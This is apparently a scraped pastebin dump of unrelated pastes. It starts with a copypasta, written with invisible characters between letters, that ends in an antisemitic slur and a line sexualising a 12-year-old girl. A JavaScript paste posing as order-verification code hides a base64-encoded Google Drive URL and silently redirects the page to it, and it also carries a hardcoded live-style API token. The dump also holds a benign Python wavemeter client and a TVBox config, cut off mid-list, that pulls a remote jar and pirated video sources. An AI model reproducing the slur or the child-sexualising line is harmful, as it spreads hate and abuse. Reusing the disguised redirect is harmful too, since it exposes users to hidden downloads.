L‎i‎f‎e‎ ‎i‎s‎ ‎a‎ ‎f‎i‎r‎s‎t‎-‎p‎e‎r‎s‎o‎n‎ ‎M‎M‎O‎R‎P‎G‎F‎P‎S‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎a‎ ‎d‎r‎u‎g‎ ‎k‎e‎e‎p‎i‎n‎g‎ ‎p‎e‎o‎p‎l‎e‎ ‎a‎w‎a‎y‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎I‎n‎t‎e‎r‎n‎e‎t‎.‎ ‎T‎h‎e‎ ‎g‎o‎a‎l‎ ‎o‎f‎ ‎i‎t‎ ‎i‎s‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎ ‎u‎n‎w‎a‎r‎r‎a‎n‎t‎e‎d‎ ‎s‎e‎l‎f‎-‎i‎m‎p‎o‎r‎t‎a‎n‎c‎e‎ ‎a‎t‎ ‎a‎l‎l‎ ‎c‎o‎s‎t‎,‎ ‎a‎n‎d‎ ‎t‎o‎ ‎g‎i‎v‎e‎ ‎c‎r‎i‎t‎i‎c‎i‎s‎m‎.‎ ‎O‎t‎h‎e‎r‎ ‎p‎l‎a‎y‎e‎r‎s‎ ‎l‎i‎k‎e‎ ‎t‎o‎ ‎b‎e‎ ‎r‎e‎m‎i‎n‎d‎e‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎p‎e‎r‎s‎o‎n‎ ‎b‎l‎o‎c‎k‎i‎n‎g‎ ‎t‎h‎e‎ ‎s‎h‎o‎w‎e‎r‎,‎ ‎w‎h‎o‎ ‎e‎a‎t‎s‎ ‎d‎r‎i‎e‎d‎ ‎b‎r‎e‎a‎d‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎a‎n‎d‎ ‎w‎h‎o‎ ‎a‎l‎w‎a‎y‎s‎ ‎g‎e‎t‎s‎ ‎l‎a‎t‎e‎ ‎t‎o‎ ‎w‎o‎r‎k‎.‎ ‎T‎h‎e‎y‎ ‎a‎l‎s‎o‎ ‎a‎d‎m‎i‎r‎e‎ ‎t‎h‎o‎s‎e‎ ‎w‎h‎o‎ ‎p‎a‎y‎ ‎l‎i‎p‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎t‎o‎ ‎p‎u‎b‎l‎i‎c‎ ‎o‎p‎i‎n‎i‎o‎n‎.‎ ‎T‎h‎e‎r‎e‎ ‎a‎r‎e‎ ‎s‎t‎a‎t‎u‎e‎s‎ ‎r‎a‎i‎s‎e‎d‎ ‎o‎v‎e‎r‎ ‎t‎h‎e‎s‎e‎ ‎t‎y‎p‎e‎s‎ ‎o‎f‎ ‎p‎e‎o‎p‎l‎e‎ ‎a‎l‎l‎ ‎o‎v‎e‎r‎ ‎t‎o‎w‎n‎.‎

T‎h‎e‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎y‎ ‎l‎e‎v‎e‎l‎ ‎i‎s‎ ‎d‎e‎f‎i‎n‎e‎d‎ ‎a‎t‎ ‎b‎i‎r‎t‎h‎,‎ ‎d‎e‎t‎e‎r‎m‎i‎n‎e‎d‎ ‎b‎y‎ ‎h‎o‎w‎ ‎m‎u‎c‎h‎ ‎g‎o‎l‎d‎ ‎y‎o‎u‎r‎ ‎i‎n‎-‎g‎a‎m‎e‎ ‎p‎a‎r‎e‎n‎t‎s‎ ‎h‎a‎d‎ ‎p‎r‎e‎v‎i‎o‎u‎s‎l‎y‎ ‎o‎b‎t‎a‎i‎n‎e‎d‎,‎ ‎a‎l‎o‎n‎g‎ ‎w‎i‎t‎h‎ ‎y‎o‎u‎r‎ ‎r‎a‎c‎e‎,‎ ‎s‎e‎x‎u‎a‎l‎i‎t‎y‎ ‎a‎n‎d‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎.‎ ‎T‎h‎i‎s‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎y‎ ‎l‎e‎v‎e‎l‎ ‎w‎i‎l‎l‎ ‎r‎e‎m‎a‎i‎n‎ ‎w‎i‎t‎h‎ ‎y‎o‎u‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎g‎a‎m‎e‎ ‎u‎n‎t‎i‎l‎ ‎y‎o‎u‎ ‎g‎e‎t‎ ‎a‎ ‎j‎o‎b‎ ‎t‎o‎ ‎e‎a‎r‎n‎ ‎y‎o‎u‎r‎ ‎o‎w‎n‎ ‎g‎o‎l‎d‎,‎ ‎w‎h‎i‎c‎h‎ ‎m‎a‎y‎ ‎i‎n‎c‎r‎e‎a‎s‎e‎ ‎o‎r‎ ‎d‎e‎c‎r‎e‎a‎s‎e‎ ‎t‎h‎e‎ ‎d‎i‎f‎f‎i‎c‎u‎l‎t‎y‎ ‎d‎e‎p‎e‎n‎d‎i‎n‎g‎ ‎o‎n‎ ‎w‎h‎e‎r‎e‎ ‎y‎o‎u‎ ‎w‎o‎r‎k‎ ‎a‎n‎d‎ ‎w‎h‎a‎t‎ ‎y‎o‎u‎ ‎d‎o‎.‎ ‎A‎ ‎s‎m‎a‎l‎l‎ ‎a‎m‎o‎u‎n‎t‎ ‎o‎f‎ ‎p‎l‎a‎y‎e‎r‎s‎ ‎p‎o‎s‎s‎e‎s‎s‎ ‎h‎i‎g‎h‎ ‎W‎i‎s‎d‎o‎m‎ ‎a‎t‎t‎r‎i‎b‎u‎t‎e‎s‎,‎ ‎a‎l‎l‎o‎w‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎b‎e‎ ‎u‎n‎p‎l‎u‎g‎g‎e‎d‎ ‎f‎r‎o‎m‎ ‎T‎h‎e‎ ‎M‎a‎t‎r‎i‎x‎.‎ ‎M‎a‎n‎y‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎p‎l‎a‎y‎e‎r‎s‎ ‎e‎n‎d‎ ‎u‎p‎ ‎d‎o‎i‎n‎g‎ ‎P‎V‎P‎ ‎r‎a‎i‎d‎s‎ ‎o‎n‎ ‎o‎t‎h‎e‎r‎ ‎u‎s‎e‎r‎s‎.‎ ‎S‎o‎m‎e‎ ‎e‎n‎d‎ ‎u‎p‎ ‎l‎a‎n‎d‎i‎n‎g‎ ‎a‎ ‎h‎i‎d‎d‎e‎n‎ ‎""‎P‎o‎l‎i‎t‎i‎c‎i‎a‎n‎""‎ ‎c‎l‎a‎s‎s‎,‎ ‎a‎l‎l‎o‎w‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎i‎n‎f‎i‎n‎i‎t‎e‎ ‎m‎o‎n‎e‎y‎ ‎a‎n‎d‎ ‎E‎X‎P‎,‎ ‎a‎n‎d‎ ‎c‎a‎n‎ ‎e‎v‎e‎n‎ ‎g‎o‎ ‎o‎n‎ ‎t‎o‎ ‎c‎o‎l‎l‎e‎c‎t‎ ‎t‎h‎e‎ ‎h‎i‎g‎h‎e‎s‎t‎ ‎s‎c‎o‎r‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎e‎r‎v‎e‎r‎!‎

(‎(‎ ‎W‎e‎ ‎S‎e‎e‎ ‎Y‎o‎u‎ ‎T‎r‎y‎i‎n‎g‎.‎ ‎S‎o‎m‎e‎ ‎D‎a‎y‎ ‎Y‎o‎u‎'‎l‎l‎ ‎G‎e‎t‎ ‎O‎n‎e‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎A‎r‎t‎S‎c‎i‎e‎n‎c‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎i‎s‎ ‎a‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎ ‎w‎i‎t‎h‎i‎n‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎g‎r‎a‎t‎e‎d‎ ‎r‎e‎s‎o‎r‎t‎ ‎o‎f‎ ‎M‎a‎r‎i‎n‎a‎ ‎B‎a‎y‎ ‎S‎a‎n‎d‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎D‎o‎w‎n‎t‎o‎w‎n‎ ‎C‎o‎r‎e‎ ‎o‎f‎ ‎S‎i‎n‎g‎a‎p‎o‎r‎e‎.‎ ‎O‎p‎e‎n‎e‎d‎ ‎i‎n‎ ‎2‎0‎1‎1‎,‎ ‎i‎t‎ ‎f‎e‎a‎t‎u‎r‎e‎s‎ ‎e‎x‎h‎i‎b‎i‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎a‎r‎t‎,‎ ‎s‎c‎i‎e‎n‎c‎e‎,‎ ‎c‎u‎l‎t‎u‎r‎e‎ ‎a‎n‎d‎ ‎t‎e‎c‎h‎n‎o‎l‎o‎g‎y‎.‎ ‎T‎h‎e‎ ‎m‎u‎s‎e‎u‎m‎ ‎w‎a‎s‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎b‎y‎ ‎M‎o‎s‎h‎e‎ ‎S‎a‎f‎d‎i‎e‎ ‎a‎n‎d‎ ‎f‎e‎a‎t‎u‎r‎e‎s‎ ‎a‎n‎ ‎e‎x‎t‎e‎r‎i‎o‎r‎ ‎m‎a‎d‎e‎ ‎o‎f‎ ‎f‎i‎b‎r‎e‎-‎r‎e‎i‎n‎f‎o‎r‎c‎e‎d‎ ‎p‎l‎a‎s‎t‎i‎c‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎d‎ ‎i‎n‎t‎e‎r‎n‎a‎l‎l‎y‎ ‎b‎y‎ ‎a‎ ‎s‎t‎e‎e‎l‎ ‎l‎a‎t‎t‎i‎c‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎n‎c‎h‎o‎r‎e‎d‎ ‎b‎y‎ ‎a‎ ‎r‎o‎u‎n‎d‎ ‎b‎a‎s‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎,‎ ‎w‎i‎t‎h‎ ‎t‎e‎n‎ ‎e‎x‎t‎e‎n‎s‎i‎o‎n‎s‎ ‎r‎e‎f‎e‎r‎r‎e‎d‎ ‎t‎o‎ ‎a‎s‎ ‎""‎f‎i‎n‎g‎e‎r‎s‎""‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎h‎a‎p‎e‎ ‎o‎f‎ ‎a‎ ‎f‎l‎o‎w‎e‎r‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎e‎ ‎A‎r‎t‎S‎c‎i‎e‎n‎c‎e‎ ‎M‎u‎s‎e‎u‎m‎ ‎w‎i‎t‎h‎ ‎o‎t‎h‎e‎r‎ ‎b‎u‎i‎l‎d‎i‎n‎g‎s‎ ‎o‎f‎ ‎S‎i‎n‎g‎a‎p‎o‎r‎e‎'‎s‎ ‎C‎e‎n‎t‎r‎a‎l‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎b‎a‎c‎k‎g‎r‎o‎u‎n‎d‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎B‎a‎s‎i‎l‎e‎ ‎M‎o‎r‎i‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

J‎e‎s‎u‎s‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎C‎h‎r‎i‎s‎t‎ ‎I‎ ‎c‎a‎n‎'‎t‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎P‎E‎T‎A‎ ‎m‎a‎d‎e‎ ‎m‎e‎ ‎p‎a‎s‎t‎e‎ ‎t‎h‎a‎t‎ ‎c‎r‎a‎p‎ ‎a‎t‎ ‎t‎h‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎.‎ ‎F‎u‎c‎k‎i‎n‎g‎ ‎k‎i‎k‎e‎s‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎I‎ ‎g‎u‎e‎s‎s‎ ‎i‎t‎'‎s‎ ‎b‎a‎c‎k‎ ‎t‎o‎ ‎i‎n‎h‎a‎l‎i‎n‎g‎ ‎a‎ ‎1‎2‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎g‎i‎r‎l‎'‎s‎ ‎p‎a‎n‎t‎i‎e‎s‎.‎"
ZjdFj3vZ,Untitled,Xp_Isolation,JavaScript,Monday 31st of March 2025 06:05:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/602/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BtXyZCGE,runWavemeter,pogen,Python,Monday 31st of March 2025 06:01:52 PM CDT,"import sys
import time
from wavemeter_client import WavemeterClient

def main(interval_sec):
    print(f""Polling Wavemeter every {interval_sec} seconds. Press Ctrl+C to stop."")
    try:
        while True:
            try:
                with WavemeterClient() as wm:
                    idn = wm.send_command(""*IDN?"", expect_response=True)
                    print(f""[{time.strftime('%H:%M:%S')}] *IDN?: {idn}"")
                    wm.send_command(""DATA:QSAVE"", expect_response=False)
            except Exception as e:
                print(f""Error during communication: {e}"")
            time.sleep(interval_sec)
    except KeyboardInterrupt:
        print(""\nStopped by user. Exiting cleanly."")

if __name__ == ""__main__"":
    interval = 30
    if len(sys.argv) > 1:
        try:
            interval = int(sys.argv[1])
        except ValueError:
            print(""Usage: python runWavemeter.py [interval_in_seconds]"")
            sys.exit(1)
    main(interval)
"
GdizrSZq,wavemeter_client,pogen,Python,Monday 31st of March 2025 05:58:35 PM CDT,"import socket
import time

class WavemeterClient:
    def __init__(self, host='127.0.0.1', port=51123, timeout=2.0, post_connect_delay=0.5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.post_connect_delay = post_connect_delay
        self.sock = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.connect((self.host, self.port))
        print(f""Connected to {self.host}:{self.port}"")
        time.sleep(self.post_connect_delay)

    def close(self):
        if self.sock:
            self.sock.close()
            self.sock = None

    def send_command(self, command, expect_response=True, post_command_delay=0.2):
        if self.sock is None:
            raise RuntimeError(""Socket is not connected."")
        full_command = command.strip() + '\r\n'
        print(f""Sending: {repr(full_command)}"")
        self.sock.sendall(full_command.encode('ascii'))
        time.sleep(post_command_delay)

        if expect_response:
            try:
                response = self.sock.recv(1024)
                return response.decode('ascii').strip()
            except socket.timeout:
                return None
        return None

    def __enter__(self):
        self.connect()
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.close()
"
prykTHFh,超秒视界,liliang74120,HTML,Monday 31st of March 2025 05:51:25 PM CDT,"#勿抄袭
{""spider"":""https://gitee.com/liliang74120/cxkj6863/raw/master/ja.jar"",""sites"":[
#切片  
{""key"":""快看资源"",""name"":""快看资源(🔥)"",""type"":3,""api"":""csp_Kuaikan"",""searchable"":1,""quickSearch"":1},  
{""key"":""天翼资源"",""name"":""天翼资源(🔥)"",""type"":0,""api"":""https://www.911ysw.top/tianyi.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""综艺"",""动漫"",""电影"",""动作片"",""犯罪片"",""冒险片"",""恐怖片"",""惊悚片"",""悬疑片"",""科幻片"",""奇幻片"",""喜剧片"",""爱情片"",""战争片"",""剧情片"",""动画片"",""纪录片"",""伦理片"",""国产剧"",""港台剧"",""日韩剧"",""欧美剧"",""泰国剧""]}, 
{""key"":""暴风影院"",""name"":""暴风影院(🔥)"",""type"":1,""api"":""http://bf.xoxowin86cisyap.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""电影片"",""动作片"",""恐怖片"",""科幻片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""纪录片"",""动漫片"",""综艺片"",""理论片"",""连续剧"",""国产剧"",""欧美剧"",""韩国剧"",""香港剧"",""日本剧"",""台湾剧"",""泰国剧"",""海外剧"",""国产动漫"",""日韩动漫"",""欧美动漫"",""海外动漫"",""港台动漫"",""大陆综艺"",""日韩综艺"",""港台综艺"",""欧美综艺"",""电影解说"",""篮球"",""足球"",""斯诺克""]},
{""key"":""最大资源"",""name"":""最大资源(🔥)"",""type"":0,""api"":""http://zuidazy.me/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""4K电影"",""邵氏电影"",""犯罪片"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""剧情片"",""战争片"",""爱情片"",""动画片"",""纪录片"",""预告片"",""演唱会"",""伦理"",""港台三级"",""韩国伦理"",""日本伦理"",""西方伦理"",""写真热舞"",""国产剧"",""港剧"",""台剧"",""泰剧"",""日剧"",""韩剧"",""欧美剧"",""海外剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""有声动漫"",""影视解说"",""爽文短句"",""女频恋爱"",""反转爽剧"",""古装仙侠"",""年代穿越"",""脑洞悬疑"",""现代都市"",""短剧"",""篮球"",""足球"",""网球""]}, 
{""key"":""新黑木耳"",""name"":""新黑木耳(🔥)"",""type"":1,""api"":""https://json.heimuer.xyz/api.php/provide/vod"",""searchable"":1,""changeable"":1,""categories"":[""网络电影"",""动作片"",""冒险片"",""战争片"",""犯罪片"",""恐怖片"",""惊悚片"",""奇幻片"",""悬疑片"",""喜剧片"",""灾难片"",""科幻片"",""剧情片"",""爱情片"",""经典片"",""歌舞片"",""其它片"",""欧美剧"",""国产剧"",""港剧"",""台剧"",""日剧"",""韩剧"",""泰剧"",""新马剧"",""其他剧"",""电视剧"",""电影"",""古装短剧"",""逆袭短剧"",""神豪短剧"",""虐恋短剧"",""重生短剧"",""复仇短剧"",""穿越短剧"",""甜宠短剧"",""强者短剧"",""其它短剧"",""动画电影"",""国产动漫"",""日本动漫"",""韩国动漫"",""欧美动漫"",""港台动漫"",""其它动漫"",""新马泰综艺"",""其他综艺"",""日本综艺"",""国产综艺"",""韩国综艺"",""港台综艺"",""欧美综艺""]},
{""key"":""新华为吧"",""name"":""新华为吧(🔥)"",""type"":0,""api"":""https://huaweiba.live/api.php/provide/vod/at/xml"",""searchable"":1,""changeable"":1,""categories"":[""网络电影"",""恐怖片"",""惊悚片"",""奇幻片"",""悬疑片"",""灾难片"",""科幻片"",""动作片"",""冒险片"",""战争片"",""犯罪片"",""喜剧片"",""剧情片"",""爱情片"",""经典片"",""纪录片"",""歌舞片"",""伦理片"",""欧美剧"",""国产剧"",""港剧"",""台剧"",""日剧"",""韩剧"",""泰剧"",""新马剧"",""其他剧"",""体育"",""动画电影"",""国产动漫"",""日韩动漫"",""欧美动漫"",""港台动漫"",""其他动漫"",""新马泰综艺"",""其他综艺"",""日韩综艺"",""国产综艺"",""港台综艺"",""欧美综艺""]}, 
{""key"":""虎牙资源"",""name"":""虎牙资源(🔥)"",""type"":1,""api"":""https://www.huyaapi.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""动画片"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""战争片"",""剧情片"",""纪录片"",""伦理片"",""香港剧"",""日剧"",""韩剧"",""欧美剧"",""马泰剧"",""台湾剧"",""内地剧"",""电视剧"",""中国动漫"",""日本动漫"",""欧美动漫"",""短剧"",""动漫"",""电影"",""综艺"",""体育赛事""]},
{""key"":""漫道资源"",""name"":""漫道资源(🔥)"",""type"":1,""api"":""http://www.mandao.site/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""犯罪片"",""悬疑片"",""奇幻片"",""剧情片"",""战争片"",""纪录片"",""连续剧"",""国产剧"",""欧美剧"",""港台剧"",""日韩剧"",""海外剧"",""动漫"",""短剧"",""体育"",""篮球"",""网球"",""足球"",""综艺"",""电影"",""斯诺克"",""电影解说""]},
{""key"":""快龙资源"",""name"":""快龙资源(🔥)"",""type"":0,""api"":""https://lz.118318.xyz/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""科幻片"",""恐怖片"",""动作片"",""喜剧片"",""爱情片"",""剧情片"",""战争片"",""伦理片"",""动漫片"",""预告片"",""记录片"",""电影片"",""综艺片"",""国产剧"",""香港剧"",""韩国剧"",""欧美剧"",""台湾剧"",""日本剧"",""海外剧"",""泰国剧"",""连续剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""日韩动漫"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""篮球"",""足球"",""网球"",""短剧"",""斯诺克"",""电影解说""]},
{""key"":""极速资源"",""name"":""极速资源(🔥)"",""type"":1,""api"":""https://jszyapi.com/api.php/provide/vod"",""searchable"":1,""changeable"":1,""categories"":[""短剧"",""日剧"",""韩剧"",""马泰剧"",""内地剧"",""欧美剧"",""香港剧"",""台湾剧"",""电视剧"",""恐怖片"",""动画片"",""剧情片"",""战争片"",""动作片"",""爱情片"",""喜剧片"",""科幻片"",""灾难片"",""悬疑片"",""犯罪片"",""奇幻片"",""记录片"",""伦理片"",""电影"",""中国动漫"",""日本动漫"",""欧美动漫"",""动漫"",""综艺"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""体育赛事""]},
{""key"":""黑墙资源"",""name"":""黑墙资源(🔥)"",""type"":0,""api"":""https://blackwallvideo.online/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""火狐资源"",""name"":""火狐资源(🔥)"",""type"":1,""api"":""https://hhzyapi.com/api.php/provide/vod/from/hhm3u8"",""searchable"":1,""quickSearch"":1,""categories"":[""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""爱情片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""悬疑片"",""犯罪片"",""奇幻片"",""灾难片"",""伦理片"",""电影"",""电视剧"",""内地剧"",""欧美剧"",""香港剧"",""短剧"",""韩剧"",""日剧"",""台湾剧"",""马泰剧"",""动漫"",""日本动漫"",""欧美动漫"",""中国动漫"",""综艺"",""大陆综艺"",""日韩综艺"",""欧美综艺"",""港台综艺""]},
{""key"":""红牛资源"",""name"":""红牛资源(🔥)"",""type"":0,""api"":""https://www.hongniuzy2.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""科幻片"",""恐怖片"",""剧情片"",""动作片"",""喜剧片"",""爱情片"",""战争片"",""伦理片"",""纪录片"",""泰剧"",""韩剧"",""日剧"",""国产剧"",""港澳剧"",""欧美剧"",""台湾剧"",""综艺"",""动漫"",""动漫电影""]},
{""key"":""飘凌资源"",""name"":""飘凌资源(🔥)"",""type"":1,""api"":""https://p2100.net/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏大片"",""国产剧"",""香港剧"",""台湾剧"",""海外剧"",""欧美剧"",""韩国剧"",""日本剧"",""综艺"",""动作片"",""喜剧片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""爱情片"",""理论片"",""动漫片"",""动漫""]},
{""key"":""无尽资源"",""name"":""无尽资源(🔥)"",""type"":0,""api"":""https://api.wujinapi.me/api.php/provide/vod/from/wjm3u8/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""奇幻片"",""剧情片"",""战争片"",""爱情片"",""悬疑片"",""犯罪片"",""伦理片"",""纪录片"",""动画片"",""日韩动漫"",""国产动漫"",""欧美动漫"",""国产剧"",""香港剧"",""台湾剧"",""海外剧"",""欧美剧"",""韩国剧"",""日本剧"",""泰剧"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺""]},
{""key"":""速播资源"",""name"":""速播资源(🔥)"",""type"":1,""api"":""https://subocaiji.com/api.php/provide/vod/from/subyun/at/json"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""纪录片"",""伦理片"",""大陆剧"",""台湾剧"",""港澳剧"",""日剧"",""韩剧"",""泰剧"",""美剧"",""电视剧"",""动漫电影"",""中国动漫"",""日本动漫"",""欧美动漫"",""动漫"",""解说"",""电影"",""综艺"",""短剧"",""体育赛事""]},
{""key"":""闪电资源"",""name"":""闪电资源(🔥)"",""type"":0,""api"":""https://shandianzy.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""邵氏电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""预告片"",""国产剧"",""韩剧"",""台剧"",""港剧"",""欧美剧"",""日剧"",""泰剧"",""海外剧"",""女频恋爱"",""反转爽剧"",""古装仙侠"",""年代穿越"",""脑洞悬疑"",""现代都市"",""国产动漫"",""欧美动漫"",""港台动漫"",""海外动漫"",""日韩动漫"",""有声动漫"",""伦理"",""港台三级"",""韩国伦理"",""日本伦理"",""西方伦理"",""写真热舞"",""演唱会"",""大陆综艺"",""港台综艺"",""日韩综艺"",""欧美综艺"",""篮球"",""足球"",""影视解说""]},
{""key"":""苹果影视"",""name"":""苹果影视(🔥)"",""type"":1,""api"":""https://pg.fenwe078.cf/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""电影"",""连续剧"",""国产剧"",""欧美剧"",""日韩剧"",""港台剧"",""海外剧"",""动漫"",""动画片"",""动漫电影"",""欧美动漫"",""日韩动漫"",""国产动漫"",""综艺"",""大陆综艺""]},
{""key"":""影图影视"",""name"":""影图影视(🔥)"",""type"":1,""api"":""https://cj.vodimg.top/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""综艺"",""动漫"",""电影"",""动作片"",""喜剧片"",""爱情片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""连续剧"",""国产剧"",""港台剧"",""日韩剧"",""欧美剧""]},
{""key"":""鸭鸭影视"",""name"":""鸭鸭影视(🔥)"",""type"":0,""api"":""https://yayazy2.com/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""梦梦影视"",""name"":""梦梦影视(🔥)"",""type"":0,""api"":""https://www.gtrgt.com//api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""等待影视"",""name"":""等待影视(🔥)"",""type"":0,""api"":""https://cj.vodimg.top/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""采库资源"",""name"":""采库资源(🔥)"",""type"":0,""api"":""https://ckzy.me/api.php/provide/vod/at/xml"",""playerUrl"":""""},
{""key"":""光速资源"",""name"":""光速资源(🔥)"",""type"":1,""api"":""https://api.guangsuapi.com/api.php/provide/vod"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""喜剧片"",""恐怖片"",""爱情片"",""科幻片"",""战争片"",""剧情片"",""伦理片"",""记录片"",""大陆剧"",""欧美剧"",""港澳剧"",""台湾剧"",""韩剧"",""日剧"",""泰剧"",""综艺"",""动漫"",""动漫电影""]},
{""key"":""索尼资源"",""name"":""索尼资源(🔥)"",""type"":0,""api"":""https://suoniapi.com/api.php/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""4K电影"",""恐怖片"",""动作片"",""喜剧片"",""科幻片"",""爱情片"",""剧情片"",""战争片"",""动画片"",""纪录片"",""预告片"",""演唱会"",""国产剧"",""欧美剧"",""韩剧"",""港剧"",""日剧"",""台剧"",""泰剧"",""海外剧"",""国产动漫"",""日韩动漫"",""欧美动漫"",""海外动漫"",""港台动漫"",""伦理"",""港台三级"",""韩国伦理"",""西方理论"",""日本伦理"",""写真热舞"",""篮球"",""足球"",""大陆综艺"",""日韩综艺"",""港台综艺"",""欧美综艺"",""影视解说"",""爽文短句""]},
{""key"":""金鹰资源"",""name"":""金鹰资源(🔥)"",""type"":0,""api"":""https://jyzyapi.com/provide/vod/at/xml"",""searchable"":1,""quickSearch"":1,""categories"":[""动作片"",""爱情片"",""喜剧片"",""科幻片"",""恐怖片"",""剧情片"",""战争片"",""动画片"",""伦理片"",""记录片"",""欧美剧"",""香港剧"",""韩剧"",""日剧"",""马泰剧"",""内地剧"",""台湾剧"",""中国动漫"",""日本动漫"",""欧美动漫"",""综艺"",""短剧"",""电影"",""电视剧"",""体育赛事""]},
